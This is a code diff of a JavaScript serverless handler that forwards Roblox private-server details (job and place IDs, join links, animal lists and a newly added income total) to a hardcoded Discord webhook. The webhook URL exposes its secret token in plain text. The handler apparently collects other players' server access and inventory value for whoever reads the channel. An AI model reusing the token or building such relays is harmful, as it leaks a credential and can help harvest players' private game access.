@@ -15,7 +15,7 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { message, username, jobid, placeid, gamename, playercount, animals, customlink, encoding } = req.query;
+    const { message, username, jobid, placeid, gamename, playercount, animals, customlink, encoding, totalincome, animalcount } = req.query;
 
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1420743327560630384/T_8tYm7D9X2Km8so2mySjyipIUhwNQ1MgZl8wiPzi0oYXoquaQZpfxtmHxIPycQGBhlz";
 
@@ -43,6 +43,7 @@ export default async function handler(req, res) {
       joinLinks = `**[Desktop App](${robloxProtocolLink})** • **[Web Browser](${webLink})**`;
     }
 
+    // Create embed with income data
     const embed = {
       title: gamename ? `${gamename} - Private Server` : 'Roblox Private Server',
       color: 10181046, // Purple color for private servers
@@ -69,6 +70,15 @@ export default async function handler(req, res) {
       }
     };
 
+    // Add income data if available
+    if (totalincome && animalcount) {
+      embed.fields.push({
+        name: '💰 Total Income',
+        value: `**$${totalincome}/s** from ${animalcount} animals`,
+        inline: true
+      });
+    }
+
     // Add place ID if available
     if (placeid) {
       embed.fields.push({
@@ -90,11 +100,21 @@ export default async function handler(req, res) {
     // Add animals data if available
     if (animals && animals !== "No%20animals%20found" && animals !== "None") {
       const decodedAnimals = decodeURIComponent(animals);
-      embed.fields.push({
-        name: '🐾 Animals Found',
-        value: decodedAnimals.length > 1024 ? decodedAnimals.substring(0, 1020) + "..." : decodedAnimals,
-        inline: false
-      });
+      
+      // Format animals field differently if we have income data
+      if (totalincome) {
+        embed.fields.push({
+          name: `🐾 Animal Details (${animalcount} animals)`,
+          value: decodedAnimals.length > 1024 ? decodedAnimals.substring(0, 1020) + "..." : decodedAnimals,
+          inline: false
+        });
+      } else {
+        embed.fields.push({
+          name: '🐾 Animals Found',
+          value: decodedAnimals.length > 1024 ? decodedAnimals.substring(0, 1020) + "..." : decodedAnimals,
+          inline: false
+        });
+      }
     }
 
     // Add custom message if provided
@@ -107,12 +127,23 @@ export default async function handler(req, res) {
       });
     }
 
+    // Create webhook content based on available data
+    let content = '';
+    if (customlink && customlink !== "None") {
+      content = `**🛡️ Private Server Scan Complete!**\nYour exact server link has been preserved below:`;
+    } else {
+      content = `**🛡️ Private Server Detected!**\nJoin using the links below:`;
+    }
+
+    // Add income to content if available
+    if (totalincome) {
+      content += `\n💰 **Total Income: $${totalincome}/s** from ${animalcount} animals`;
+    }
+
     const webhookData = {
       username: username || 'Private Server Scanner',
       embeds: [embed],
-      content: customlink && customlink !== "None" ? 
-        `**🛡️ Private Server Scan Complete!**\nYour exact server link has been preserved below:` :
-        `**🛡️ Private Server Detected!**\nJoin using the links below:`
+      content: content
     };
 
     // Send to Discord
@@ -132,6 +163,8 @@ export default async function handler(req, res) {
         used_custom_link: !!customlink && customlink !== "None",
         custom_link_preserved: customlink && customlink !== "None",
         original_custom_link: finalCustomLink,
+        total_income: totalincome || null,
+        animal_count: animalcount || null,
         jobid: jobid,
         timestamp: new Date().toISOString()
       });
@@ -153,4 +186,3 @@ export default async function handler(req, res) {
     });
   }
 }
-
